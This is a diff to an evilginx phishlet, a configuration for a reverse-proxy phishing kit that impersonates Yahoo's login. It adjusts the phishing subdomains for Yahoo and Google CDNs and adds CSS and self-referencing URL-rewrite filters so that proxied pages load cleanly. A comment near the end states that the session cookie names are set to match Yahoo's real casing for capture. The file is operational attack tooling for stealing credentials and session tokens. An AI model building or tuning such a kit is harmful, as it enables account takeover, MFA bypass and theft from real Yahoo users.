@@ -11,14 +11,14 @@ proxy_hosts:
   - {phish_sub: 'video', orig_sub: 'video-api.yql', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
   - {phish_sub: 'yep', orig_sub: 'yep.video', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
   - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, auto_filter: false, is_landing: false}
-  - {phish_sub: 's', orig_sub: 's', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
-  - {phish_sub: 'o', orig_sub: 'o', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'scdn', orig_sub: 's', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'ocdn', orig_sub: 'o', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
   - {phish_sub: 'api2', orig_sub: 'api-2-0', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
   - {phish_sub: 'static', orig_sub: 'static-cdn', domain: 'spot.im', auto_filter: true, session: false, is_landing: false}
   - {phish_sub: 'launcher', orig_sub: 'launcher', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
   - {phish_sub: 'consent', orig_sub: 'consent.cmp', domain: 'oath.com', session: false, auto_filter: true, is_landing: false}
   - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, auto_filter: false, is_landing: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, auto_filter: true, is_landing: false}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, auto_filter: true, is_landing: false}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.net', session: false, auto_filter: false, is_landing: false}
 
 sub_filters:
@@ -36,9 +36,12 @@ sub_filters:
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https:\u002F\u002Flogin.yahoo.net', replace: 'https:\u002F\u002Flogin.{domain}', mimes: ['text/html']}
   # yimg.com (Yahoo's CDN) sub-filters
-  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/css', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  # yimg.com self-referencing sub-filters (for CSS background-image URLs within yimg responses)
+  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/css', 'text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 's.yimg.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/css', 'text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
   # Yahoo primary session cookies — names match real Yahoo cookie casing (evilginx is case-sensitive).
